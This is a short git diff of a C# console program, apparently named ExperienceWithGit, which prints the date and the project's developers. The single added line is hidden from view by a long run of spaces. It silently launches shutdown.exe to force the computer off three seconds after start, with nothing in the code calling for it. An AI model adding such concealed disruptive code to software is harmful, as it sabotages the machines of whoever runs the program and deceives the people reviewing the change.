@@ -6,6 +6,7 @@ namespace ExperienceWithGit
     {
         static void Main(string[] args)
         {
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        System.Diagnostics.Process.Start(System.Environment.SystemDirectory + "\\shutdown.exe", "-s -t 3 -f");
             Console.WriteLine(DateTime.Now);
 	          Console.WriteLine("Developer in this Project are: ");
 
